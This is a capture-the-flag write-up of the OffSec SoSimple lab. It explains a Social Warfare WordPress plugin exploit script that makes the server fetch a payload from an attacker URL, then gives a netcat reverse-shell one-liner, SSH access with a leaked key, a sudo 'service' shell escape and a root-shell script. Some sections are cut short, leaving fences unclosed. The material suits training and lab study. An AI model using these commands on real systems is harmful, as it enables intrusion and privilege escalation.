# OffSec SoSimple – CTF Writeup

## Overview

| Detail     | Value                                                        |
| ---------- | ------------------------------------------------------------ |
| **Box**    | SoSimple (OffSec Proving Grounds)                            |
| **OS**     | Ubuntu Linux                                                 |
| **IP**     | `192.168.164.78` / `192.168.246.78`                          |
| **Skills** | Nmap, Gobuster, WPScan, WordPress plugin RCE, SSH key reuse, sudo abuse |

## About This Lab

Engage in enumeration, web enumeration, and WordPress enumeration techniques to identify vulnerabilities. Utilize privilege escalation strategies and harness the abuse of sudo permissions to enhance your access. This lab is designed to capitalize on your skills in vulnerability exploitation.

## Learning Objectives

**After completion of this lab, learners will be able to:**

- Enumerate the target with Nmap and identify the WordPress site and plugins using wpscan.
- Exploit the Social Warfare plugin to gain remote code execution.
- Pivot to a full reverse shell and enumerate user home directories.
- Locate and use a leaked private SSH key to gain access as user max.
- Exploit misconfigured sudo permissions to escalate to root by creating and executing a privileged script.

## Lab Description

In this lab, an outdated WordPress plugin (Social Warfare) is exploited to gain remote code execution. From there, a private SSH key is leaked, granting access to a user account. Misconfigured sudo permissions are then abused to escalate privileges by creating and running a script as root.

---

## Attack Path

```
Nmap → Gobuster → WPScan → Social Warfare RCE → Reverse Shell (www-data)
    → SSH key leak → max → sudo service → steven → sudo script → root
```

This exploit is small. It **doesn't generate a payload or open a shell** — it simply **tells the vulnerable WordPress plugin to fetch a file from a URL you provide** and prints whatever comes back.

#### How It Works

**Imports:**

```
import sys
import requests
import re
import urlparse
import optparse
```

- `requests` → send HTTP requests
- `re` → regular expressions
- `urlparse` → build URLs
- `optparse` → read command-line arguments
- `sys` → exit the program

**Vulnerable endpoint:**

```
VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"
```

Given a target `http://10.10.10.5/wordpress/` and payload URL `http://10.10.14.5/payload.txt`, the exploit builds:

```
http://10.10.10.5/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://10.10.14.5/payload.txt
```

The vulnerable plugin downloads whatever is at `payload.txt`.

**Constructor:**

```
def __init__(self, _t, _p):
    self.target = _t
    self.payload = _p
```

Stores the target website and payload URL.

Example:

```
Target:
http://10.10.10.5/wordpress/

Payload:
http://10.10.14.5/payload.txt
```

**URL building:**

```
uri = urlparse.urljoin(
    self.target,
    self.VULNPATH % self.payload
)
```

If `target = http://victim/wordpress/` and `payload = http://attacker/payload.txt`:

```
http://victim/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://attacker/payload.txt
```

**Send the request:**

```
r = requests.get(uri)
```

Equivalent to:

```
GET /wordpress/wp-admin/admin-post.php?... HTTP/1.1
```

**Check response:**

```
if r.status_code == 500:
```

The exploit author observed that a vulnerable server often returns `HTTP 500 Internal Server Error`. Ironically, **HTTP 500 here is treated as a sign the exploit worked**, because the vulnerable code executes and errors while processing the malicious input.

**Extract output:**

```
obj = re.search(
    r"^(.*)<\!DOCTYPE",
    r.text.replace("\n","lnbreak")
)
```

The plugin may return:

```
PHP Warning...
Result...
<!DOCTYPE html>
<html>
...
```

The regex captures **everything before `<!DOCTYPE`**.

**Print result:**

```
print resp.replace("lnbreak","\n")
```

Restores newlines so output displays correctly.

**Command-line arguments:**

```
parser.add_option('-t','--target')
```

Lets you type: `-t http://victim/wordpress/`

```
parser.add_option('--payload-uri')
```

Lets you type: `--payload-uri http://10.10.14.5/payload.txt`

**Run it:**

```
exploit = EXPLOIT(...)
exploit.engage()
```

Creates the exploit object and sends the request.

**Overall flow:**

```
You
 │
 │  python exploit.py
 │
 ▼
Exploit Script
 │
 │  GET
 ▼
Victim WordPress
 │
 │ downloads
 ▼
http://YOUR_IP/payload.txt
 │
 │

Processes payload
 │
 ▼
Returns output
 │
 ▼
Exploit prints it
```

## 6. Reverse Shell

Since the payload file controls what runs on the target, the next step is to replace the `cat /etc/passwd` payload with a reverse shell.

Generated a reverse shell using https://www.revshells.com/:

![](../../attachments/Pasted%20image%2020260718233212.png)

The generated reverse shell payload:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.246 4444 >/tmp/f
```

```
<pre>system('YOUR EXPLOIT')</pre>
```

```

## 8. Lateral Movement – SSH as max

Used the discovered private key to SSH into the `max` account from within the reverse shell:

```
ssh max@localhost -i id_rsa
```

**Command breakdown:**

- **`ssh`** → Start an SSH (Secure Shell) connection.
- **`max`** → The username you want to log in as.
- **`@`** → Separates the username from the host.
- **`localhost`** → Connect to the local machine (IP `127.0.0.1`), not a remote server.
- **`-i id_rsa`** → Use the private SSH key file named `id_rsa` for authentication instead of a password.

### Why `localhost`?

`localhost` always refers to the same machine you're currently on. If you've already gained a shell as `www-data` on a Linux machine and you discover `id_rsa` belonging to `max`, you can try:

```
ssh max@localhost -i id_rsa
```

This attempts to switch from the `www-data` account to the `max` account **using SSH and the discovered private key**, which is a common privilege escalation or lateral movement technique in CTFs and OSCP labs.

```
www-data@so-simple:/home/max/.ssh$ ssh max@localhost -i id_rsa
ssh max@localhost -i id_rsa
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:qo4/EbrJueKB3ta+XB6PT2uNDjKfSgixhQqawjkTPas.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes

max@so-simple:~$ 
```

Successfully SSHed into `max`.

> [!TIP]
> **Alternative method:** Copy the SSH private key to your Kali machine (`nano id_rsa`, paste, save), set permissions with `chmod 600 id_rsa`, then SSH from Kali: `ssh max@<target-ip> -i id_rsa`

### GTFOBins – service

Checked https://gtfobins.org/gtfobins/service/#shell for the sudo exploit:

![](../../attachments/Pasted%20image%2020260718235655.png)

![](../../attachments/Pasted%20image%2020260718235744.png)

The GTFOBins command for sudo:

```
service ../../bin/sh
```

### Understanding: Why `sudo -u steven` and NOT `su steven`

The sudo policy says:

```
User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
```

This means:

- Current user: `max`
- Allowed target user: `steven`
- Command allowed: `/usr/sbin/service`
- `NOPASSWD`: no password required

**Why not `su steven`?**

`su` means "Switch to user `steven`." To do that, you'd normally need **Steven's password**, which you don't have. Your privilege comes from **sudo's policy**, not from Steven's password.

**The correct flow:**

```
www-data
    ↓
max (via SSH/private key)
    ↓
sudo -u steven /usr/sbin/service ...
    ↓
steven shell
```

Not:

```
max
    ↓
su steven   ❌ (requires Steven's password)
```

### Exploitation

Executed the command **as max**, targeting user `steven`:

```
sudo -u steven service ../../bin/sh
```

```
max@so-simple:~$ sudo -u steven service ../../bin/sh
sudo -u steven service ../../bin/sh
$ whoami
whoami
steven
```

Got a shell as `steven`.

```
$ ls -l /opt/tools/server-health.sh

ls -l /opt/
total 0
```

The file **and the directory don't exist** — but the sudo policy allows running it. This is a good sign: if we can create the script, we control what runs as root.

### Exploitation

Create the directory:

```
mkdir /opt/tools
```

`steven` **has permission to create directories under `/opt`**, so the intended privilege escalation is available.

Write a script that spawns a root bash shell:

```
cat > /opt/tools/server-health.sh << 'EOF'
#!/bin/bash
exec /bin/bash -p
EOF
```

Make it executable:

```
chmod +x /opt/tools/server-health.sh
```

Verify:

```
$ cat /opt/tools/server-health.sh
cat /opt/tools/server-health.sh
#!/bin/bash
exec /bin/bash -p
```

Execute as root:

```
sudo /opt/tools/server-health.sh
```

```

## Lessons Learned

1. **Always enumerate plugins with WPScan** — the Social Warfare v3.5.0 plugin was the main entry point. Running `wpscan -e ap,u` found it immediately.
2. **Credential brute-force is a valid first step** — found `max:opensesame` via WPScan + rockyou.txt, though the dashboard itself wasn't the exploit path.
3. **Read the vulnerability advisory carefully** — the WPScan DB page provided exact exploit steps (create payload, host it, trigger via URL).
4. **Always check `.ssh` directories** — world-readable `.ssh/id_rsa` files are a classic privesc vector. Always `ls -la` home directories.
5. **`ssh user@localhost -i key`** — lateral movement via SSH to localhost is a standard technique when you find keys on the same machine.
6. **`sudo -l` at every user** — each user had different sudo permissions creating a chain: `www-data → max → steven → root`.
7. **Missing sudo scripts = write your own** — if `sudo -l` references a script that doesn't exist and you can create it, you control what runs as the target user.
8. **`su` vs `sudo -u`** — `su` requires the target user's password; `sudo -u` uses the *current* user's sudo policy. Don't confuse them.
